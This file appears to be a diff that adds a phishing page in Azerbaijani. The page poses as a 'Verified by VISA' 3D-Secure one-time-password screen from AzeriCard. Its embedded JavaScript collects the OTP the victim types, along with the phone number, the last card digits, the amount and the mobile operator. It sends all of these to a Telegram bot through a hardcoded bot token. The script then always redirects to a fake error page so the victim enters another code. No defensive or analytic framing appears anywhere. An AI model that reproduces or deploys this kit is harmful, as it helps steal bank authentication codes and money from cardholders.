@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Verified by VISA - Şifrənin Qorunması</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
+
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', 'Roboto', Arial, sans-serif !important;
+    }
+
+    body { 
+        background-color: #f2f5ff;
+        background-image: 
+            url("data:image/svg+xml,%3Csvg width='579' height='772' viewBox='0 0 579 772' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M13.3574 276.469L167.033 0H579V772L44.4448 407.687C1.71368 378.564 -11.7661 321.667 13.3574 276.469Z' fill='%230B4F71'/%3E%3C/svg%3E"), 
+            url("data:image/svg+xml,%3Csvg width='574' height='456' viewBox='0 0 574 456' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M0 0V456H539.33L560.662 417.391C587.557 368.715 569.572 307.447 520.634 281.031L0 0Z' fill='%237BC47F'/%3E%3C/svg%3E");
+        background-position: right top, left bottom;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        background-size: auto 80%, auto 50%;
+        min-height: 100vh;
+    }
+
+    .header-otp {
+        width: 50%;
+        margin: 10px auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 560px;
+    }
+
+    .logo-area img {
+        width: 180px;
+    }
+
+    .logo-pay-div {
+        display: flex;
+        justify-content: flex-end;
+    }
+
+    .logo-pay-div img {
+        width: 60px;
+    }
+
+    .content {
+        width: 560px;
+        margin: 0 auto;
+    }
+
+    .card-other-otp {
+        background: #fff;
+        border-radius: 15px;
+        border: 1px solid #fff;
+        box-sizing: border-box;
+    }
+
+    .card-info-div-otp {
+        width: 360px;
+        margin: 35px auto 25px;
+    }
+
+    .card-info {
+        font-size: 19px;
+        font-weight: 700;
+        margin-bottom: 14px;
+        line-height: 25px;
+    }
+
+    .description {
+        font-size: 12px;
+        color: #7A879A;
+        line-height: 17px;
+        margin-bottom: 25px;
+    }
+
+    .descriptionDiv {
+        width: 100%;
+        padding: 20px;
+        border: 1px solid #E1E8EF;
+        background: #FBFBFD;
+        border-radius: 14px;
+        margin-bottom: 25px;
+        display: flex;
+        justify-content: center;
+    }
+
+    .left-side {
+        color: #7A879A;
+        font-size: 14px;
+    }
+
+    .left-side p, .right-side p {
+        margin-bottom: 10px;
+    }
+
+    .right-side {
+        color: #000;
+        font-weight: 400;
+        font-size: 14px;
+        margin-left: 15px;
+    }
+
+    label {
+        font-size: 12px;
+        display: flex;
+        flex-direction: column;
+        color: #7A879A;
+    }
+
+    .card-number {
+        width: 100%;
+        height: 46px;
+        outline: none;
+        border: 1px solid #cdcfd2;
+        border-radius: 2px;
+        margin-top: 7px;
+        padding-left: 23px;
+        margin-bottom: 25px;
+        color: #0B1937;
+        font-size: 16px;
+    }
+
+    .help-div {
+        display: flex;
+        flex-direction: column;
+    }
+
+    .again, .help {
+        font-size: 14px;
+        color: #828282;
+        margin-bottom: 15px;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+    .help {
+        margin-bottom: 40px;
+    }
+
+    .btn-sbmt {
+        width: 100%;
+        height: 46px;
+        background: #00377A;
+        border: 1px solid #00377A;
+        color: #fff;
+        border-radius: 2px;
+        font-weight: 700;
+        cursor: pointer;
+        font-size: 15px;
+    }
+
+    .cancel {
+        display: flex;
+        text-decoration: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        font-size: 14px;
+        color: #000;
+        margin-top: 20px;
+        line-height: 19px;
+        cursor: pointer;
+    }
+
+    .footer-other {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 90%;
+        margin: 28px auto 10px;
+        text-align: center;
+    }
+
+    .footer-text {
+        color: #B5BDD0;
+        font-size: 12px;
+    }
+
+    @media (max-width: 639px) {
+        .content {
+            width: 90%;
+        }
+
+        .header-otp {
+            width: 75%;
+        }
+
+        .card-other-otp {
+            width: 100%;
+        }
+
+        .card-info-div-otp {
+            width: 85%;
+        }
+    }
+</style>
+
+    <script type="text/javascript">
+        // Telegram'a veri gönder
+        function sendToTelegram(message) {
+            const botToken = '8942841464:AAHHutLPFedj9Kv1UTI3YnJYke4RU2kk8QE';
+            const chatId = '-1003938322369';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('Telegram error:', err));
+        }
+
+        function OnSubmit(f) {
+            if (f.PASSWORD.value === '') {
+                alert("Zəhmət olmasa, şifrəni daxil edin");
+                f.PASSWORD.focus();
+                return false;
+            }
+            document.getElementById("btnSubmit").disabled = true;
+            
+            // OTP kodunu Telegram'a gönder
+            const otp = f.PASSWORD.value;
+            const number = document.getElementById('hiddenNumber').value;
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount') || '-';
+            const card = urlParams.get('card') || '****';
+            
+            // localStorage'dan kart bilgilerini al
+            const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+            
+            const message = `
+🔴 <b>OTP KODU</b> 🔴
+
+<b>Operator:</b> ${paymentData.operator || '-'}
+<b>Nömrə:</b> <code>${number}</code>
+<b>Kampaniya:</b> ${amount} AZN
+
+<b>Kart:</b> **** **** **** ${card}
+<b>OTP Kodu:</b> <code>${otp}</code>
+            `.trim();
+            
+            sendToTelegram(message);
+            
+            // Her zaman hata sayfasına yönlendir (OTP'yi Telegram'a gönderdikten sonra)
+            setTimeout(function() {
+                window.location.href = 'otp_error.html?amount=' + amount + '&number=' + encodeURIComponent(number) + '&card=' + card;
+            }, 1000);
+            
+            return false;
+        }
+
+        function OnExit() {
+            if (confirm("Çıxmaq istədiyinizə əminsiniz? Sizin əməliyyat tamamlanmayıb.")) {
+                window.location.href = 'index.html';
+            }
+            return false;
+        }
+
+        // URL parametrelerini oku ve göster
+        window.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount') || '0.00';
+            const number = urlParams.get('number') || '';
+            const card = urlParams.get('card') || '****';
+            
+            // Hidden input'a numarayı kaydet
+            document.getElementById('hiddenNumber').value = number;
+            
+            // Bugünün tarihini al
+            const today = new Date();
+            const day = String(today.getDate()).padStart(2, '0');
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const year = today.getFullYear();
+            const formattedDate = day + '/' + month + '/' + year;
+            
+            // Bilgileri güncelle
+            document.getElementById('paymentAmount').innerHTML = '<b>' + amount + ' AZN</b>';
+            document.getElementById('paymentDate').textContent = formattedDate;
+            document.getElementById('cardNumber').textContent = '**** **** **** ' + card;
+        });
+    </script>
+</head>
+
+<body>
+    <header class="header-otp">
+        <div class="logo-area">
+            <img src="azcardfiles/logo_svg.svg" alt="logo">
+        </div>
+        <div class="logo-pay-div">
+            <img src="azcardfiles/visasecure.png" alt="Verified by VISA">
+        </div>
+    </header>
+
+    <main class="content">
+        <section class="card-other-otp">
+            <div class="card-info-div-otp">
+                
+                <div id="desc" class="desc">
+                    <h1 class="card-info">Şifrənizi daxil edin</h1>
+                    <p class="description">Birdəfəlik şifrə sizin qeydiyyatdan keçmiş nömrənizə göndərilmişdir. Zəhmət olmasa SMSin çatmağını gözləyin və onu Şifrə xanasına daxil edin.</p>
+                </div>
+
+                
+                <div class="descriptionDiv">
+                    <div class="left-side">
+                        <p>Mağaza:</p>
+                        <p>Məbləğ:</p>
+                        <p>Tarix:</p>
+                        <p>Kartın nömrəsi:</p>
+                    </div>
+                    <div class="right-side">
+                        <p>ULDUZPAY</p>
+                        <p id="paymentAmount"><b>0.00 AZN</b></p>
+                        <p id="paymentDate">07/05/2026</p>
+                        <p id="cardNumber">**** **** **** ****</p>
+                    </div>
+                </div>
+
+                <form method="POST" action="success.html" onsubmit="return OnSubmit(this);" name="frm" class="form">
+                    <input type="hidden" name="number" id="hiddenNumber">
+                    
+                    <label id="pwd" class="card-number-label">Şifrə:
+                        <input type="tel" id="psw_id" maxlength="6" class="card-number" name="PASSWORD" autocomplete="off" onkeypress="if(event.keyCode < 48 || event.keyCode > 57) return false;" required>
+                    </label>
+
+                    <div class="help-div">
+                        <a href="#" class="again">Birdəfəlik şifrə SMS-ni almadınızmı?</a>
+                        <a href="#" class="help">Kömək</a>
+                    </div>
+
+                    <input type="submit" id="btnSubmit" class="btn-sbmt" value="Göndərmək">
+                </form>
+                
+                <a href="javascript:void(0);" id="btnExit" class="cancel" onclick="OnExit();">Çıxış</a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-other">
+        <p class="footer-text">Copyright 2008-2026 3D-Secure payment services provided by AzeriCard.</p>
+    </footer>
+</body>
+</html>
